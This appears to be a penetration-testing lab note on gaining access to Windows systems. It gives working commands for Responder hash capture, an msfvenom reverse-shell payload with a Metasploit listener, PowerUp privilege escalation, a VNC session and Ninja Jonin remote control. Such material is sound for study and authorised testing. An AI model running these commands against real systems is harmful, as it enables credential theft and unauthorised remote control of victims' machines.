# Gain Access

first step in system hacking is to gain access to a target system using information obtained and loopholes found in the system’s access control mechanism. With this step, you will use various techniques such as password cracking, vulnerability exploitation, and social engineering to gain access to the target system.

Vulnerability exploitation involves the execution of multiple complex, interrelated steps to gain access to a remote system. Attackers use discovered vulnerabilities to develop exploits, deliver, and execute the exploits on the remote system.

***

## Active Online Attack to crack the System's Password using Responder

**LLMNR** (Link Local Multicast Name Resolution) and **NBT-NS** (NetBIOSNameService) are two main elements of Windows OSes that are used to perform name resolution for hosts present on the same link. These services are enabled by default in Windows OSes and can be used to extract the password hashes from a user.&#x20;

By listening for LLMNR/NBT-NS broadcast requests, an attacker can spoof the server and send a response claiming to be the legitimate server. After the victim system accepts the connection, it is possible to gain the victim’s user-credentials by using a tool such as Responder.py.

Responder is an LLMNR, NBT-NS, and MDNS poisoner. It responds to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix. By default, the tool only responds to a File Server Service request, which is for SMB.

{% embed url="https://github.com/lgandx/Responder" %}

### Set up Responder

```
sudo responder -I [interface]
```

* -I: Specifies the interface, check the interface issue **ifconfig** command.

The attack will success if a user try to access the AD. The access logs of target machine will be captured and collects the hashes of the logged in user of the target machine. Responder kept their logs in /usr/share/responder/logs. Copy the hash value of user x, create a file name hash.txt and run password cracking tools name John the ripper or hashcat to crack the password.

***

## Find Vulnerabilities on Exploit Sites

Exploit sites contain the details of the latest vulnerability of various OSes, devices, and applications. You can use these sites to find relevant vulnerabilities about the target system based on the information gathered, and further download the exploits from the database and use exploitation tools such as Metasploit, to gain remote access.

{% embed url="https://www.exploit-db.com/" %}

{% embed url="https://vuldb.com/" %}

{% embed url="https://cve.mitre.org/" %}

{% embed url="https://vulners.com/" %}

{% embed url="https://cve.circl.lu/" %}

***

## Exploit Client-side Vulnerabilities and Establish a VNC session

Attackers use client-side vulnerabilities to gain access to the target machine. VNC(Virtual Network Computing) enables an attacker to remotely access and control the targeted computers using another computer or mobile device from anywhere in the world. At the same time, VNC is also used by network administrators and organization throughout every industry sector for a range of different scenarios and uses, including providing IT desktop support to colleagues and friends and accessing systems and services on the move.

### Generate a malicious file

```
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=10.10.1.13 LPORT=4444 -o /home/attacker/Desktop/Test.exe
```

### Send the malicious payload to the target.

### Set up listener, could use metasploit

```
use exploit/multi/handler
set windows/meterpreter/reverse_tcp
set LHOST VALUE
set LPORT VALUE
exploit
```

### After the app running and get the session

```
sessions -i 1
```

### Upload PowerUp.ps1

PowerUp.ps1 is a program that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities. It utilizes various service abuse checks, .dll hijacking opportunities, registry checks, etc. to enumerate common elevation methods for a target system.

```
upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1
```

### change shell session

could change the shell session &#x20;

```
shell
```

### Check for misconfigured service

The result will displaying **Check** and **AbuseFunction** that the attacker can exploit the misconfigured services such as unquoted service paths, service object permissions, unattended installs, modifiable registry autoruns and configurations, and other locations to elevate access privileges.

```
powershell -ExecutionPolicy Bypass -Command ". .\PowerUp.ps1;Invoke-AllChecks"
```

### Running the vnc

back to meterpreter shell and exploit the VNC vulnerability.

```
run vnc
```

***

## Gain accessto a remote system using Ninja Jonin

Ninja Jonin is a combination of two tools; **Ninja** is installed in victim machine and **Jonin** is installed on the attacker machine. The main functionality of the tool is to control a remote machine behind any NAT, Firewall, and Proxy.

### Attacker Machine

Extract **Jonin** zip and create a folder and extract **Ninja** zip in the same folder. Change the config located in folder **config**, on **Constant.json** change the **NAME** and **HOST** according to the victim. Start the listener, which is **Jonin.exe.** Make the zip and send it to the victim.&#x20;

### Victim Machine

Extract the zip and run the **ninja** file. Observe that the terminal will connect

### exploit

```
list # ensure have catch the reverse shell
connect 1 # connect the server
change
cmd # get the cmd session
ipconfig # check the ip address
#help # check for further action command such as upload and download file, etc.
```

***

##

